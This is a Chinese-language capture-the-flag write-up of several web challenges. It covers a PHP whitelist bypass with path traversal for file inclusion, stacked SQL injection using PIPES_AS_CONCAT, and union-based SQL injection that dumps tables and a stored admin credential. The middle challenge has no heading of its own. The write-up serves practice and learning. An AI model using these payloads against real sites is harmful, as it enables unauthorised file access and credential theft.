[HCTF 2018]WarmUp

提示：PHP、代码审计

通过链接进入，会出现一个笑脸

然后习惯性的查看源代码，发现有个source.php,试着访问一下

我们去访问这个文件，源码就出来了，提示又有代码审计，所以要分析一下源码

首先通过$_REQUEST获取到file参数的值，通过empty()判断file参数是不是为空，并取反，通过is_string()判断是不是字符串，调用emmm类的静态方法checkFile()，并把获取file的值传入，然后通过include文件包含。

现在就需要看checkFile()方法了，首先通过数组$whitelist定义了两个白名单(source.php、hint.php)

我们试着访问hint.php，然后告诉我们flag的位置

告诉我们flag在ffffllllaaaagggg这个文件，参数file的值是可控的，通过include包含了file的值，到这就大概率是通过文件包含ffffllllaaaagggg得到flag了。

现在回到checkFile()方法，看代码

第一个if条件判断page是否设置过值(且非NULL)并且是否是字符串变量

第二个if条件判断page是否在白名单$whitelist里面，如果在继续向下执行

第三个if条件判断mb_strpos — 查找字符串在另一个字符串中首次出现的位置，mb_substr() 函数返回字符串的一部分，之前我们学过 substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。

也就是说在我们传入的参数中添加一个?，然后再用mb_strpos返回?第一次出现的位置，最后再用mb_substr截取字符串

第四次的就是先对page进行了一次URL解码，然后跟第三次一样

我们最后构造的payload：?file=source.php?../../../../../ffffllllaaaagggg(我们并不知道ffffllllaaaagggg在哪，所以要试)

没思路的时候就去看大佬的wp

有预期解和非预期解

非预期解

这里的sql语句应该不是select $_POST['query'] from xxx，应该是select $_POST['query']｜ from xxx，所以这个地方用*是查不出来的，因为*和|不能一起用，但是这里没有过滤,可以使用*,1

预期解

预期解应该是1;set sql_mode=PIPES_AS_CONCAT;select 1

在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能

[极客大挑战 2019]LoveSQL

经过测试，在username和password都存在注入点，并且单引号报错，双引号并不报错。

测试会有三个字段，并且２和３是回显的，数据库是geek

接下来就可以通过注入获取数据了

爆表：1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),version() #

两个表geekuser,l0ve1ysq1

爆字段：1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='geekuser'),version() #

字段username,password

数据：1' union select 1,(select group_concat(username,password) from geekuser),version() #

得到：admin3fbd8b6c4404e38a8ae0c4952e8b792d

另一个表

爆字段：1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'),version() #

字段跟上面一样，查一下数据试试

数据：1' union select 1,(select group_concat(username,password) from l0ve1ysq1),version() #

得到的数据有重叠而且很多，不方便阅读，右击查看源码
